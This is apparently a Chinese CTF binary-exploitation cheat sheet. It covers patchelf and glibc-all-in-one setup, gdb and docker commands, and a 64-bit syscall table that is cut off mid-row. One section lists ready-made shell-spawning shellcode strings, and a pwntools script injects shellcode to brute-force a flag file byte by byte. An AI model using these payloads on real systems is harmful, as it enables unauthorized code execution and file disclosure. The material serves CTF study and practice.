    <content type="html"><![CDATA[<p>总结一些常用的技巧。</p><span id="more"></span><h2 id="patchelf——替换文件的libc和ld"><a href="#patchelf——替换文件的libc和ld" class="headerlink" title="patchelf——替换文件的libc和ld"></a>patchelf——替换文件的libc和ld</h2><p>如果出题方没有提供<code>libc</code>和<code>ld</code>，请看技巧<code>glibc-all-in-one——查找libc/ld/.debug</code>：</p><p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/185193/37/30162/4434/63c7ad55F0660ee0e/1543736411453741.png"></p><p>更换前：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/177648/14/31676/38386/63c7ad56Ff8f96af0/34a9c8de00276d1e.png" style="zoom:80%;" /><p>装载命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 新ld和libc均使用绝对路径</span></span><br><span class="line"><span class="comment"># 更换ld</span></span><br><span class="line"><span class="comment"># patchelf --set-interpreter /path/to/ld.so /path/to/binary</span></span><br><span class="line">patchelf --set-interpreter /home/anza/hgame/spfa/ld-2.31.so ./spfa</span><br><span class="line"><span class="comment"># 更换libc</span></span><br><span class="line"><span class="comment"># patchelf --replace-needed originlibc newlibc /path/to/binary</span></span><br><span class="line">patchelf --replace-needed libc.so.6 /home/anza/hgame/spfa/libc-2.31.so ./spfa</span><br></pre></td></tr></table></figure><p>更换后：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/4230/21/20981/40404/63c7ad56F2f43d7dd/a51d37282b0c94d1.png" style="zoom:80%;" /><h2 id="glibc-all-in-one——查找libc-ld-debug"><a href="#glibc-all-in-one——查找libc-ld-debug" class="headerlink" title="glibc-all-in-one——查找libc/ld/.debug"></a>glibc-all-in-one——查找libc/ld/.debug</h2><p><code>patchelf</code>修改了<code>libc</code>和<code>ld</code>，而<code>gdb</code>调试时会去寻找<code>libc</code>目录下的<code>.debug</code>文件，所以无法使用一些<code>heap/bins</code>之类的命令，因此我们去<code>glibc-all-in-one</code>中下载对应版本的<code>libc</code>及其附带的<code>.debug</code>。</p><p>实现操作如下：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">cd /glibc-all-in-one/</span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ sudo python3 update_list</span><br><span class="line">[+] <span class="keyword">Common</span> <span class="keyword">list</span> has been <span class="keyword">save</span> <span class="keyword">to</span> <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release <span class="keyword">list</span> has been <span class="keyword">save</span> <span class="keyword">to</span> <span class="string">&quot;old_list&quot;</span></span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ cat <span class="keyword">list</span></span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu11.<span class="number">3</span>_amd64</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu11.<span class="number">3</span>_i386</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu3_amd64</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu3_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">5</span>_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">5</span>_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">6</span>_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">6</span>_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">9</span>_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">9</span>_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9_i386</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3.<span class="number">1</span>_amd64</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3.<span class="number">1</span>_i386</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3_amd64</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3_i386</span><br><span class="line"><span class="number">2.36</span>-<span class="number">0</span>ubuntu1_amd64</span><br><span class="line"><span class="number">2.36</span>-<span class="number">0</span>ubuntu1_i386</span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ sudo ./download <span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ cd libs/</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one/libs$ ls</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one/libs$ cd <span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br></pre></td></tr></table></figure><p>在该目录下<code>ctrl+h</code>便能显示出隐藏文件<code>.debug</code>，将<code>.debug</code>复制到题目的目录下，<code>gdb</code>调试命令就恢复了。</p><h2 id="gdb带基址调试"><a href="#gdb带基址调试" class="headerlink" title="gdb带基址调试"></a>gdb带基址调试</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *$rebase(0x相对基址偏移)</span><br></pre></td></tr></table></figure><h2 id="关闭Alarm"><a href="#关闭Alarm" class="headerlink" title="关闭Alarm"></a>关闭Alarm</h2><p>命令行关闭法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i s/alarm/isnan/g ./vuln</span><br></pre></td></tr></table></figure><h2 id="docker调试命令"><a href="#docker调试命令" class="headerlink" title="docker调试命令"></a>docker调试命令</h2><p>基本命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br><span class="line">docker start 容器id</span><br><span class="line">docker exec -it 容器id /bin/bash</span><br><span class="line">docker cp 本地路径 容器id:容器路径</span><br></pre></td></tr></table></figure><p>docker 打开 tmux，以及打开鼠标滚动:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmux new</span><br></pre></td></tr></table></figure><p>docker 在 tmux 下调试脚本需添加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;sp&#x27;, &#x27;-h&#x27;]</span><br></pre></td></tr></table></figure><h2 id="一些shellcode"><a href="#一些shellcode" class="headerlink" title="一些shellcode"></a>一些shellcode</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 32位 短字节shellcode --&gt; 21字节</span><br><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br><span class="line"></span><br><span class="line"># 32位 纯ascii字符shellcode</span><br><span class="line">PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA</span><br><span class="line"></span><br><span class="line"># 32位 scanf可读取的shellcode</span><br><span class="line">\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh</span><br><span class="line"></span><br><span class="line"># 64位 scanf可读取的shellcode 22字节</span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br><span class="line"></span><br><span class="line"># 64位 较短的shellcode  23字节</span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><br><span class="line"></span><br><span class="line"># 64位 纯ascii字符shellcode</span><br><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure><p>可能用到的爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 这里的pwn只是为了演示流程，具体逻辑还得看题目</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">p, index, ch</span>):</span><br><span class="line">code = <span class="string">&quot;push 0x67616c66; mov rdi, rsp; mov rsi, 0x0; mov rax, 0x2; syscall;&quot;</span>  <span class="comment"># open</span></span><br><span class="line">code += <span class="string">&quot;mov rdi, 0x3; mov rsi, rsp; mov rdx, 0x30; mov rax, 0x0; syscall;&quot;</span>   <span class="comment"># read</span></span><br><span class="line">code += <span class="string">&quot;cmp byte ptr[rsi+&#123;&#125;], &#123;&#125;; jz loop;&quot;</span>.<span class="built_in">format</span>(index, ch)                <span class="comment"># cmp</span></span><br><span class="line">code += <span class="string">&quot;xor edi, edi; mov rax, 60; syscall; loop: jmp loop;&quot;</span>                 <span class="comment"># 等则进入死循环，否则exit(0)</span></span><br><span class="line">code = <span class="string">b&quot;\x90&quot;</span>*<span class="number">20</span>+asm(code)  <span class="comment"># 前面加了\x90滑板</span></span><br><span class="line"></span><br><span class="line">p.send(code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    flag_str = string.printable</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x30</span>):</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = process(<span class="string">&quot;./babystack&quot;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                ch = flag_str[index]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; test ch &#123;&#125;&quot;</span>.<span class="built_in">format</span>(ch))</span><br><span class="line">                pwn(p, offset, <span class="built_in">ord</span>(flag_str[index]))</span><br><span class="line">                p.recv(timeout=<span class="number">1</span>)</span><br><span class="line">                flag += ch</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; find flag: &quot;</span>, flag)</span><br><span class="line">                p.close()</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="comment"># 捕获p.recv产生的错误</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">10</span>)</span><br><span class="line">                <span class="built_in">print</span>(e)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">10</span>)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    p.close()</span><br><span class="line">                    index += <span class="number">1</span></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="comment"># 捕获p.close产生的错误</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">10</span>)</span><br><span class="line">                    <span class="built_in">print</span>(e)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">10</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="comment"># 判断flag是否已经结束</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="linux-下查找"><a href="#linux-下查找" class="headerlink" title="linux 下查找"></a>linux 下查找</h2><p>​    查找内容包含特定字符串的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;__dls3&quot; ./</span><br></pre></td></tr></table></figure><p>​    查找文件名中包含特定字符串的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -name &#x27;*2021-11-01*&#x27;</span><br></pre></td></tr></table></figure><h2 id="常见-signal"><a href="#常见-signal" class="headerlink" title="常见 signal"></a>常见 signal</h2><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309072013720.png" alt="image-20230907201341848" style="zoom:50%;" /><h2 id="64-位系统调用"><a href="#64-位系统调用" class="headerlink" title="64 位系统调用"></a>64 位系统调用</h2><table><thead><tr><th>系统调用号</th><th>函数名</th><th>入口点</th></tr></thead><tbody><tr><td>0</td><td>read</td><td>sys_read</td></tr><tr><td>1</td><td>write</td><td>sys_write</td></tr><tr><td>2</td><td>open</td><td>sys_open</td></tr><tr><td>3</td><td>close</td><td>sys_close</td></tr><tr><td>4</td><td>stat</td><td>sys_newstat</td></tr><tr><td>5</td><td>fstat</td><td>sys_newfstat</td></tr><tr><td>6</td><td>lstat</td><td>sys_newlstat</td></tr><tr><td>7</td><td>poll</td><td>sys_poll</td></tr><tr><td>8</td><td>lseek</td><td>sys_lseek</td></tr><tr><td>9</td><td>mmap</td><td>sys_mmap</td></tr><tr><td>10</td><td>mprotect</td><td>sys_mprotect</td></tr><tr><td>11</td><td>munmap</td><td>sys_munmap</td></tr><tr><td>12</td><td>brk</td><td>sys_brk</td></tr><tr><td>13</td><td>rt_sigaction</td><td>sys_rt_sigaction</td></tr><tr><td>14</td><td>rt_sigprocmask</td><td>sys_rt_sigprocmask</td></tr><tr><td>15</td><td>rt_sigreturn</td><td>stub_rt_sigreturn</td></tr><tr><td>16</td><td>ioctl</td><td>sys_ioctl</td></tr><tr><td>17</td><td>pread64</td><td>sys_pread64</td></tr><tr><td>18</td><td>pwrite64</td><td>sys_pwrite64</td></tr><tr><td>19</td><td>readv</td><td>sys_readv</td></tr><tr><td>20</td><td>writev</td><td>sys_writev</td></tr><tr><td>21</td><td>access</td><td>sys_access</td></tr><tr><td>22</td><td>pipe</td><td>sys_pipe</td></tr><tr><td>23</td><td>select</td><td>sys_select</td></tr><tr><td>24</td><td>sched_yield</td><td>sys_sched_yield</td></tr><tr><td>25</td><td>mremap</td><td>sys_mremap</td></tr><tr><td>26</td><td>msync</td><td>sys_msync</td></tr><tr><td>27</td><td>mincore</td><td>sys_mincore</td></tr><tr><td>28</td><td>madvise</td><td>sys_madvise</td></tr><tr><td>29</td><td>shmget</td><td>sys_shmget</td></tr><tr><td>30</td><td>shmat</td><td>sys_shmat</td></tr><tr><td>31</td><td>shmctl</td><td>sys_shmctl</td></tr><tr><td>32</td><td>dup</td><td>sys_dup</td></tr><tr><td>33</td><td>dup2</td><td>sys_dup2</td></tr><tr><td>34</td><td>pause</td><td>sys_pause</td></tr><tr><td>35</td><td>nanosleep</td><td>sys_nanosleep</td></tr><tr><td>36</td><td>getitimer</td><td>sys_getitimer</td></tr><tr><td>37</td><td>alarm</td><td>sys_alarm</td></tr><tr><td>38</td><td>setitimer</td><td>sys_setitimer</td></tr><tr><td>39</td><td>getpid</td><td>sys_getpid</td></tr><tr><td>40</td><td>sendfile</td><td>sys_sendfile64</td></tr><tr><td>41</td><td>socket</td><td>sys_socket</td></tr><tr><td>42</td><td>connect</td><td>sys_connect</td></tr><tr><td>43</td><td>accept</td><td>sys_accept</td></tr><tr><td>44</td><td>sendto</td><td>sys_sendto</td></tr><tr><td>45</td><td>recvfrom</td><td>sys_recvfrom</td></tr><tr><td>46</td><td>sendmsg</td><td>sys_sendmsg</td></tr><tr><td>47</td><td>recvmsg</td><td>sys_recvmsg</td></tr><tr><td>48</td><td>shutdown</td><td>sys_shutdown</td></tr><tr><td>49</td><td>bind</td><td>sys_bind</td></tr><tr><td>50</td><td>listen</td><td>sys_listen</td></tr><tr><td>51</td><td>getsockname</td><td>sys_getsockname</td></tr><tr><td>52</td><td>getpeername</td><td>sys_getpeername</td></tr><tr><td>53</td><td>socketpair</td><td>sys_socketpair</td></tr><tr><td>54</td><td>setsockopt</td><td>sys_setsockopt</td></tr><tr><td>55</td><td>getsockopt</td><td>sys_getsockopt</td></tr><tr><td>56</td><td>clone</td><td>stub_clone</td></tr><tr><td>57</td><td>fork</td><td>stub_fork</td></tr><tr><td>58</td><td>vfork</td><td>stub_vfork</td></tr><tr><td>59</td><td>execve</td><td>stub_execve</td></tr><tr><td>60</td><td>exit</td><td>sys_exit</td></tr><tr><td>61</td><td>wait4</td><td>sys_wait4</td></tr><tr><td>62</td><td>kill</td><td>sys_kill</td></tr><tr><td>63</td><td>uname</td><td>sys_newuname</td></tr><tr><td>64</td><td>semget</td><td>sys_semget</td></tr><tr><td>65</td><td>semop</td><td>sys_semop</td></tr><tr><td>66</td><td>semctl</td><td>sys_semctl</td></tr><tr><td>67</td><td>shmdt</td><td>sys_shmdt</td></tr><tr><td>68</td><td>msgget</td><td>sys_msgget</td></tr><tr><td>69</td><td>msgsnd</td><td>sys_msgsnd</td></tr><tr><td>70</td><td>msgrcv</td><td>sys_msgrcv</td></tr><tr><td>71</td><td>msgctl</td><td>sys_msgctl</td></tr><tr><td>72</td><td>fcntl</td><td>sys_fcntl</td></tr><tr><td>73</td><td>flock</td><td>sys_flock</td></tr><tr><td>74</td><td>fsync</td><td>sys_fsync</td></tr><tr><td>75</td><td>fdatasync</td><td>sys_fdatasync</td></tr><tr><td>76</td><td>truncate</td><td>sys_truncate</td></tr><tr><td>77</td><td>ftruncate</td><td>sys_ftruncate</td></tr><tr><td>78</td><td>getdents</td><td>sys_getdents</td></tr><tr><td>79</td><td>getcwd</td><td>sys_getcwd</td></tr><tr><td>80</td><td>chdir</td><td>sys_chdir</td></tr><tr><td>81</td><td>fchdir</td><td>sys_fchdir</td></tr><tr><td>82</td><td>rename</td><td>sys_rename</td></tr><tr><td>83</td><td>mkdir</td><td>sys_mkdir</td></tr><tr><td>84</td><td>rmdir</td><td>sys_rmdir</td></tr><tr><td>85</td><td>creat</td><td>sys_creat</td></tr><tr><td>86</td><td>link</td><td>sys_link</td></tr><tr><td>87</td><td>unlink</td><td>sys_unlink</td></tr><tr><td>88</td><td>symlink</td><td>sys_symlink</td></tr><tr><td>89</td><td>readlink</td><td>sys_readlink</td></tr><tr><td>90</td><td>chmod</td><td>sys_chmod</td></tr><tr><td>91</td><td>fchmod</td><td>sys_fchmod</td></tr><tr><td>92</td><td>chown</td><td>sys_chown</td></tr><tr><td>93</td><td>fchown</td><td>sys_fchown</td></tr><tr><td>94</td><td>lchown</td><td>sys_lchown</td></tr><tr><td>95</td><td>umask</td><td>sys_umask</td></tr><tr><td>96</td><td>gettimeofday</td><td>sys_gettimeofday</td></tr><tr><td>97</td><td>getrlimit</td><td>sys_getrlimit</td></tr><tr><td>98</td><td>getrusage</td><td>sys_getrusage</td></tr><tr><td>99</td><td>sysinfo</td><td>sys_sysinfo</td></tr><tr><td>100</td><td>times</td><td>sys_times</td></tr><tr><td>101</td><td>ptrace</td><td>sys_ptrace</td></tr><tr><td>102</td><td>getuid</td><td>sys_getuid</td></tr><tr><td>103</td><td>syslog</td><td>sys_syslog</td></tr><tr><td>104</td><td>getgid</td><td>sys_getgid</td></tr><tr><td>105</td><td>setuid</td><td>sys_setuid</td></tr><tr><td>106</td><td>setgid</td><td>sys_setgid</td></tr><tr><td>107</td><td>geteuid</td><td>sys_geteuid</td></tr><tr><td>108</td><td>getegid</td><td>sys_getegid</td></tr><tr><td>109</td><td>setpgid</td><td>sys_setpgid</td></tr><tr><td>110</td><td>getppid</td><td>sys_getppid</td></tr><tr><td>111</td><td>getpgrp</td><td>sys_getpgrp</td></tr><tr><td>112</td><td>setsid</td><td>sys_setsid</td></tr><tr><td>113</td><td>setreuid</td><td>sys_setreuid</td></tr><tr><td>114</td><td>setregid</td><td>sys_setregid</td></tr><tr><td>115</td><td>getgroups</td><td>sys_getgroups</td></tr><tr><td>116</td><td>setgroups</td><td>sys_setgroups</td></tr><tr><td>117</td><td>setresuid</td><td>sys_setresuid</td></tr><tr><td>118</td><td>getresuid</td><td>sys_getresuid</td></tr><tr><td>119</td><td>setresgid</td><td>sys_setresgid</td></tr><tr><td>120</td><td>getresgid</td><td>sys_getresgid</td></tr><tr><td>121</td><td>getpgid</td><td>sys_getpgid</td></tr><tr><td>122</td><td>setfsuid</td><td>sys_setfsuid</td></tr><tr><td>123</td><td>setfsgid</td><td>sys_setfsgid</td></tr><tr><td>124</td><td>getsid</td><td>sys_getsid</td></tr><tr><td>125</td><td>capget</td><td>sys_capget</td></tr><tr><td>126</td><td>capset</td><td>sys_capset</td></tr><tr><td>127</td><td>rt_sigpending</td><td>sys_rt_sigpending</td></tr><tr><td>128</td><td>rt_sigtimedwait</td><td>sys_rt_sigtimedwait</td></tr><tr><td>129</td><td>rt_sigqueueinfo</td><td>sys_rt_sigqueueinfo</td></tr><tr><td>130</td><td>rt_sigsuspend</td><td>sys_rt_sigsuspend</td></tr><tr><td>131</td><td>sigaltstack</td><td>sys_sigaltstack</td></tr><tr><td>132</td><td>utime</td><td>sys_utime</td></tr><tr><td>133</td><td>mknod</td><td>sys_mknod</td></tr><tr><td>134</td><td>uselib</td><td></td></tr><tr><td>135</td><td>personality</td><td>sys_personality</td></tr><tr><td>136</td><td>ustat</td><td>sys_ustat</td></tr><tr><td>137</td><td>statfs</td><td>sys_statfs</td></tr><tr><td>138</td><td>fstatfs</td><td>sys_fstatfs</td></tr><tr><td>139</td><td>sysfs</td><td>sys_sysfs</td></tr><tr><td>140</td><td>getpriority</td><td>sys_getpriority</td></tr><tr><td>141</td><td>setpriority</td><td>sys_setpriority</td></tr><tr><td>142</td><td>sched_setparam</td><td>sys_sched_setparam</td></tr><tr><td>143</td><td>sched_getparam</td><td>sys_sched_getparam</td></tr><tr><td>144</td><td>sched_setscheduler</td><td>sys_sched_setscheduler</td></tr><tr><td>145</td><td>sched_getscheduler</td><td>sys_sched_getscheduler</td></tr><tr><td>146</td><td>sched_get_priority_max</td><td>sys_sched_get_priority_max</td></tr><tr><td>147</td><td>sched_get_priority_min</td><td>sys_sched_get_priority_min</td></tr><tr><td>148</td><td>sched_rr_get_interval</td><td>sys_sched_rr_get_interval</td></tr><tr><td>149</td><td>mlock</td><td>sys_mlock</td></tr><tr><td>150</td><td>munlock</td><td>sys_munlock</td></tr><tr><td>151</td><td>mlockall</td><td>sys_mlockall</td></tr><tr><td>152</td><td>munlockall</td><td>sys_munlockall</td></tr><tr><td>153</td><td>vhangup</td><td>sys_vhangup</td></tr><tr><td>154</td><td>modify_ldt</td><td>sys_modify_ldt</td></tr><tr><td>155</td><td>pivot_root</td><td>sys_pivot_root</td></tr><tr><td>156</td><td>_sysctl</td><td>sys_sysctl</td></tr><tr><td>157</td><td>prctl</td><td>sys_prctl</td></tr><tr><td>158</td><td>arch_prctl</td><td>sys_arch_prctl</td></tr><tr><td>159</td><td>adjtimex</td><td>sys_adjtimex</td></tr><tr><td>160</td><td>setrlimit</td><td>sys_setrlimit</td></tr><tr><td>161</td><td>chroot</td><td>sys_chroot</td></tr><tr><td>162</td><td>sync</td><td>sys_sync</td></tr><tr><td>163</td><td>acct</td><td>sys_acct</td></tr><tr><td>164</td><td>settimeofday</td><td>sys_settimeofday</td></tr><tr><td>165</td><td>mount</td><td>sys_mount</td></tr><tr><td>166</td><td>umount2</td><td>sys_umount</td></tr><tr><td>167</td><td>swapon</td><td>sys_swapon</td></tr><tr><td>168</td><td>swapoff</td><td>sys_swapoff</td></tr><tr><td>169</td><td>reboot</td><td>sys_reboot</td></tr><tr><td>170</td><td>sethostname</td><td>sys_sethostname</td></tr><tr><td>171</td><td>setdomainname</td><td>sys_setdomainname</td></tr><tr><td>172</td><td>iopl</td><td>stub_iopl</td></tr><tr><td>173</td><td>ioperm</td><td>sys_ioperm</td></tr><tr><td>174</td><td>create_module</td><td></td></tr><tr><td>175</td><td>init_module</td><td>sys_init_module</td></tr><tr><td>176</td><td>delete_module</td><td>sys_delete_module</td></tr><tr><td>177</td><td>get_kernel_syms</td><td></td></tr><tr><td>178</td><td>query_module</td><td></td></tr><tr><td>179</td><td>quotactl</td><td>sys_quotactl</td></tr><tr><td>180</td><td>nfsservctl</td><td></td></tr><tr><td>181</td><td>getpmsg</td><td></td></tr><tr><td>182</td><td>putpmsg</td><td></td></tr><tr><td>183</td><td>afs_syscall</td><td></td></tr><tr><td>184</td><td>tuxcall</td><td></td></tr><tr><td>185</td><td>security</td><td></td></tr><tr><td>186</td><td>gettid</td><td>sys_gettid</td></tr><tr><td>187</td><td>readahead</td><td>sys_readahead</td></tr><tr><td>188</td><td>setxattr</td><td>sys_setxattr</td></tr><tr><td>189</td><td>lsetxattr</td><td>sys_lsetxattr</td></tr><tr><td>190</td><td>fsetxattr</td><td>sys_fsetxattr</td></tr><tr><td>191</td><td>getxattr</td><td>sys_getxattr</td></tr><tr><td>192</td><td>lgetxattr</td><td>sys_lgetxattr</td></tr><tr><td>193</td><td>fgetxattr</td><td>sys_fgetxattr</td></tr><tr><td>194</td><td>listxattr</td><td>sys_listxattr</td></tr><tr><td>195</td><td>llistxattr</td><td>sys_llistxattr</td></tr><tr><td>196</td><td>flistxattr</td><td>sys_flistxattr</td></tr><tr><td>197</td><td>removexattr</td><td>sys_removexattr</td></tr><tr><td>198</td><td>lremovexattr</td><td>sys_lremovexattr</td></tr><tr><td>199</td><td>fremovexattr</td><td>sys_fremovexattr</td></tr><tr><td>200</td><td>tkill</td><td>sys_t